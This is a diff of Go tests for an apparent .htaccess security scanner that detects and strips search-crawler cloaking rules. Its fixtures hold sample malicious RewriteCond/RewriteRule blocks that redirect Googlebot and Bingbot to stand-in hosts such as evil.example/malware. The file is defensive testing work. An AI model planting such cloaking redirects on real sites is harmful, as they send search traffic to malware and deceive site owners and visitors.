@@ -21,6 +21,7 @@ import (
 func TestUACloakCleanRemovesPairedRewriteRule(t *testing.T) {
 	dir := t.TempDir()
 	body := "RewriteEngine On\n" +
+		"# keep this operator comment\n" +
 		"RewriteCond %{HTTP_USER_AGENT} (Googlebot|Bingbot) [NC]\n" +
 		"RewriteRule ^(.*)$ http://evil.example/malware/$1 [L,R=302]\n"
 	path := writeHtaccess(t, dir, "site", body)
@@ -43,6 +44,9 @@ func TestUACloakCleanRemovesPairedRewriteRule(t *testing.T) {
 	if !strings.Contains(cleaned, "RewriteEngine On") {
 		t.Errorf("unrelated RewriteEngine directive was destroyed:\n%s", cleaned)
 	}
+	if !strings.Contains(cleaned, "# keep this operator comment") {
+		t.Errorf("unrelated comment before the cloak block was destroyed:\n%s", cleaned)
+	}
 }
 
 // A chain of two crawler conds feeding one rule must be removed whole. If only
@@ -57,7 +61,11 @@ func TestUACloakCleanRemovesFullCondChain(t *testing.T) {
 		"RewriteRule ^(.*)$ http://evil.example/x/$1 [L,R=302]\n"
 	path := writeHtaccess(t, dir, "site", body)
 
-	_, ranges := AuditHtaccessFile(path)
+	findings, ranges := AuditHtaccessFile(path)
+	if countByCheck(findings, "htaccess_user_agent_cloak") != 2 {
+		t.Fatalf("two crawler conds should each emit a ua_cloak finding, got %d",
+			countByCheck(findings, "htaccess_user_agent_cloak"))
+	}
 	cleaned := string(applyRangeRemoval([]byte(body), ranges))
 	if strings.Contains(cleaned, "RewriteRule") || strings.Contains(cleaned, "RewriteCond") {
 		t.Errorf("cond chain / rule survived clean:\n%s", cleaned)
@@ -67,6 +75,87 @@ func TestUACloakCleanRemovesFullCondChain(t *testing.T) {
 	}
 	if !strings.Contains(cleaned, "RewriteEngine On") {
 		t.Errorf("unrelated directive destroyed:\n%s", cleaned)
+	}
+}
+
+func TestUACloakCleanPairsAcrossCommentsAndBlankLines(t *testing.T) {
+	dir := t.TempDir()
+	body := "RewriteEngine On\n" +
+		"# keep this operator comment\n" +
+		"RewriteCond %{HTTP_REFERER} bad.example [NC]\n" +
+		"# attacker condition note\n" +
+		"RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]\n" +
+		"\n" +
+		"# attacker rule note\n" +
+		"RewriteRule ^(.*)$ http://evil.example/commented/$1 [L,R=302]\n" +
+		"Header set X-Keep yes\n"
+	path := writeHtaccess(t, dir, "site", body)
+
+	findings, ranges := AuditHtaccessFile(path)
+	if countByCheck(findings, "htaccess_user_agent_cloak") != 1 {
+		t.Fatalf("commented UA cloak block should emit one finding, got %d",
+			countByCheck(findings, "htaccess_user_agent_cloak"))
+	}
+	cleaned := string(applyRangeRemoval([]byte(body), ranges))
+	for _, gone := range []string{"RewriteCond", "RewriteRule", "bad.example", "evil.example/commented"} {
+		if strings.Contains(cleaned, gone) {
+			t.Errorf("cloak content %q survived clean:\n%s", gone, cleaned)
+		}
+	}
+	for _, want := range []string{"RewriteEngine On", "# keep this operator comment", "Header set X-Keep yes"} {
+		if !strings.Contains(cleaned, want) {
+			t.Errorf("unrelated content %q was removed:\n%s", want, cleaned)
+		}
+	}
+}
+
+func TestUACloakDoesNotPairAcrossUnrelatedDirective(t *testing.T) {
+	dir := t.TempDir()
+	body := "RewriteEngine On\n" +
+		"RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]\n" +
+		"Header set X-Keep yes\n" +
+		"RewriteRule ^(.*)$ http://evil.example/unrelated/$1 [L,R=302]\n"
+	path := writeHtaccess(t, dir, "site", body)
+
+	findings, ranges := AuditHtaccessFile(path)
+	if countByCheck(findings, "htaccess_user_agent_cloak") != 0 {
+		t.Fatalf("UA cond separated from RewriteRule by Header directive should not pair, got %d",
+			countByCheck(findings, "htaccess_user_agent_cloak"))
+	}
+	cleaned := string(applyRangeRemoval([]byte(body), ranges))
+	for _, want := range []string{"RewriteCond", "Header set X-Keep yes", "RewriteRule", "evil.example/unrelated"} {
+		if !strings.Contains(cleaned, want) {
+			t.Errorf("unrelated content %q was removed:\n%s", want, cleaned)
+		}
+	}
+}
+
+func TestUACloakCleanRemovesMultipleBlocksIndependently(t *testing.T) {
+	dir := t.TempDir()
+	body := "RewriteEngine On\n" +
+		"RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]\n" +
+		"RewriteRule ^a$ http://evil.example/one [L,R=302]\n" +
+		"Header set X-Keep yes\n" +
+		"RewriteCond %{HTTP_USER_AGENT} Bingbot [NC]\n" +
+		"RewriteRule ^b$ http://evil.example/two [L,R=302]\n" +
+		"# footer\n"
+	path := writeHtaccess(t, dir, "site", body)
+
+	findings, ranges := AuditHtaccessFile(path)
+	if countByCheck(findings, "htaccess_user_agent_cloak") != 2 {
+		t.Fatalf("two independent cloak blocks should emit two findings, got %d",
+			countByCheck(findings, "htaccess_user_agent_cloak"))
+	}
+	cleaned := string(applyRangeRemoval([]byte(body), ranges))
+	for _, gone := range []string{"evil.example/one", "evil.example/two", "RewriteCond", "RewriteRule"} {
+		if strings.Contains(cleaned, gone) {
+			t.Errorf("cloak content %q survived clean:\n%s", gone, cleaned)
+		}
+	}
+	for _, want := range []string{"RewriteEngine On", "Header set X-Keep yes", "# footer"} {
+		if !strings.Contains(cleaned, want) {
+			t.Errorf("unrelated content %q was removed:\n%s", want, cleaned)
+		}
 	}
 }
 
